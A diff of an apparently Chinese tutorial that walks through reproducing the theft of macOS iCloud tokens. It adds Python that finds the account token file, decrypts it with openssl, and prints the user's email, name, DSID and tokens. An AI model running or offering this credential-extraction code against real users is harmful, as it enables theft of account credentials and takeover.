@@ -162,7 +162,7 @@ hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()
 hexedKey = binascii.hexlify(hashed)
 ```
 
-我们知道用户的授权Token都存放在**~/Library/Application Support/iCloud/Accounts/** 下，所以要遍历一下该文件夹下面的文件，判断是否为我们所需要的DSID文件。
+我们知道用户的授权Token都存放在**~/Library/Application Support/iCloud/Accounts/** 下，所以要遍历一下该文件夹下面的文件，判断是否为我们所需要的DSID文件(纯数字文件名)。
 
 ```python
 mmeTokenFile = glob.glob("%s/Library/Application Support/iCloud/Account/*" % os.path.expanduser("~"))
@@ -179,7 +179,33 @@ else:
     print "Decrypting token plist -> [%s]\n" % mmeTokenFile
 ```
 
+接下来我们使用openssl这个命令行工具，将一个空的初始化向量IV和上面已经被16进制转换的密钥，以及我们找到DSID文件，进行128位的AES解密。
 
+```python
+decryptedBinary = subprocess.check_output("openssl enc -d -aes-128-cbc -iv '%s' -K %s < '%s'" % (IV, hexedKey, mmeTokenFile), shell=True)
+```
+
+这里得到的decryptedBinary是解密出来的二进制数据，我们使用Foundation库里面的类来将它转化为可读取的plist格式。
+
+然后遍历这个plist格式对象，将其中的内容打印出来。
+
+```python
+binToPlist = NSData.dataWithBytes_length_(decryptedBinary, len(decryptedBinary))
+
+tokenPlist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, 0, None, None)[0]
+
+print "Successfully decrypted token plist!\n"
+print "%s [%s -> %s]" % (tokenPlist["appleAccountInfo"]["primaryEmail"], tokenPlist["appleAccountInfo"]["fullName"], tokenPlist["appleAccountInfo"]["dsPrsID"])
+print tokenPlist["tokens"]
+```
+
+
+
+至此，我们的重现步骤到此结束，整个流程下来你可以发现，只要用户不小心点击了“允许”按钮，我们就很容易的窃取到了iCloud里面的Token。
+
+你可以尝试在自己的机子上运行这份代码，假如能够打印出来相关的iCloud账号Token，那就说明你成功重现了。
+
+![](https://ww1.sinaimg.cn/large/006tKfTcgy1fgpsk3r7b3j308c08c3ys.jpg)
 
 
 
